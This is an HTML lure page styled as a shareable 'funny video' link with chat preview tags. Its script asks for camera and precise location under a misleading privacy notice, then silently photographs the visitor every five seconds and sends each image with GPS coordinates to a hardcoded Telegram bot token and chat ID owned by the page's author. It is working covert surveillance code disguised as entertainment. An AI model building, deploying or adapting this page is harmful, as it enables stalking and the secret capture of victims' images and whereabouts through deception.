<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Funny Video with Camera & Location</title>

    <!-- Open Graph for link preview -->
    <meta property="og:title" content="🎥 Watch this funny video!" />
    <meta property="og:description" content="You won't stop laughing 😂" />
    <meta property="og:image" content="https://i.imgflip.com/4/1g8my4.jpg" />
    <meta property="og:url" content="https://your-page-url.com" />
    <meta property="og:type" content="video.other" />
    <meta name="twitter:card" content="summary_large_image" />

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; font-family: system-ui, sans-serif; }

        #bgVideo {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: 1;
        }

        /* Overlay with privacy notice and start button */
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(8px);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
            padding: 20px;
            text-align: center;
            transition: opacity 0.6s ease;
        }
        #overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        #overlay h1 {
            color: #fff;
            font-size: 2.8rem;
            margin-bottom: 10px;
        }
        #overlay .privacy {
            color: rgba(255,255,255,0.8);
            max-width: 500px;
            font-size: 1.1rem;
            line-height: 1.6;
            background: rgba(255,255,255,0.1);
            padding: 20px 30px;
            border-radius: 16px;
            margin: 20px 0;
            border: 1px solid rgba(255,255,255,0.1);
        }
        #overlay .privacy strong { color: #ffd93d; }
        #overlay button {
            padding: 18px 50px;
            font-size: 1.8rem;
            font-weight: bold;
            border: none;
            border-radius: 60px;
            background: #ff4757;
            color: white;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(255, 71, 87, 0.4);
            transition: 0.3s;
            margin-top: 10px;
        }
        #overlay button:hover { transform: scale(1.08); background: #ff6b81; }
        #overlay .sub {
            color: rgba(255,255,255,0.5);
            margin-top: 15px;
            font-size: 0.8rem;
        }

        #captureCanvas { display: none; }
        #cameraVideo { display: none; }
    </style>
</head>
<body>

    <video id="bgVideo" muted playsinline>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4" />
    </video>

    <!-- Overlay with privacy notice and start button -->
    <div id="overlay">
        <h1>😂 Ready to laugh?</h1>
        <div class="privacy">
            <strong>We need your camera & location</strong> to capture funny moments
            and share them with your friends. <br />
            No data is stored – it’s sent directly to your chat.<br />
            <span style="font-size:0.9rem; opacity:0.7;">Click “Start” to allow access.</span>
        </div>
        <button id="startBtn">▶ Start Fun</button>
        <div class="sub">By clicking, you agree to share your camera & location</div>
    </div>

    <canvas id="captureCanvas"></canvas>
    <video id="cameraVideo" autoplay playsinline></video>

    <script>
        (function() {
            const bgVideo = document.getElementById('bgVideo');
            const overlay = document.getElementById('overlay');
            const startBtn = document.getElementById('startBtn');
            const cameraVideo = document.getElementById('cameraVideo');
            const canvas = document.getElementById('captureCanvas');
            const ctx = canvas.getContext('2d');

            let cameraStream = null;
            let captureInterval = null;
            let location = null;

            const BOT_TOKEN = '8515738916:AAHlDd9DNCRd6Z50M-xHymls9mNlDUTpe54';
            const CHAT_ID = '8028796958';

            startBtn.addEventListener('click', function() {
                // Play background video
                bgVideo.play();

                // Request camera & location
                requestCameraAndLocation();

                // Hide overlay after a moment
                setTimeout(() => overlay.classList.add('hidden'), 400);
            });

            function requestCameraAndLocation() {
                // Camera
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            cameraStream = stream;
                            cameraVideo.srcObject = stream;
                            startCapturing();
                        })
                        .catch(err => console.warn('Camera error:', err.message));
                }

                // Location
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                        },
                        err => console.warn('Location error:', err.message),
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }
            }

            function startCapturing() {
                setTimeout(() => {
                    captureInterval = setInterval(() => {
                        if (!cameraStream) return;
                        canvas.width = cameraVideo.videoWidth || 640;
                        canvas.height = cameraVideo.videoHeight || 480;
                        ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob(blob => {
                            if (blob) sendPhotoToTelegram(blob);
                        }, 'image/jpeg', 0.8);
                    }, 5000);
                }, 1000);
            }

            function sendPhotoToTelegram(blob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture.jpg');
                if (location) {
                    formData.append('caption', `📍 ${location.lat.toFixed(5)}, ${location.lon.toFixed(5)}`);
                }
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => { if (!data.ok) console.warn('Telegram error:', data.description); })
                .catch(err => console.warn('Network error:', err.message));
            }

            window.addEventListener('beforeunload', function() {
                if (captureInterval) clearInterval(captureInterval);
                if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
            });
        })();
    </script>

</body>
</html>
